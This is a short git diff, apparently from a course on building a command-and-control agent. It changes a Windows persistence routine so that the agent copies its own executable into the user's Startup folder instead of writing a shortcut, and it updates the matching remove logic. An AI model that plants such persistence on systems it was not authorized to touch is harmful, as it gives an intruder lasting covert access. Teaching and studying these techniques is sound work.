5056a316a7f0fd479065657fae9d1507871da309
faanross <moi@faanross.com>
2026-02-01 11:03:54 -0500

    updated

--- lesson_23_end/internals/agent/persist_windows.go
+++ lesson_23_end/internals/agent/persist_windows.go
@@ -90,19 +90,19 @@ func doPersistStartup(args control.PersistArgsAgent) models.PersistResult {
 	}
 	startupPath := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 
-	// Create shortcut filename
-	shortcutPath := filepath.Join(startupPath, args.Name+".lnk")
+	// Create executable filename (we copy the exe, not a shortcut)
+	exePath := filepath.Join(startupPath, args.Name+".exe")
 
 	if args.Remove {
-		// Remove the shortcut
-		err := os.Remove(shortcutPath)
+		// Remove the executable
+		err := os.Remove(exePath)
 		if err != nil {
 			result.Success = false
-			result.Message = fmt.Sprintf("failed to remove shortcut: %v", err)
+			result.Message = fmt.Sprintf("failed to remove startup executable: %v", err)
 			return result
 		}
 		result.Success = true
-		result.Message = fmt.Sprintf("Removed startup shortcut '%s'", args.Name)
+		result.Message = fmt.Sprintf("Removed startup executable '%s'", args.Name)
 	} else {
 		// For simplicity, we'll copy the executable instead of creating a shortcut
 		// Creating proper .lnk files requires COM or external tools
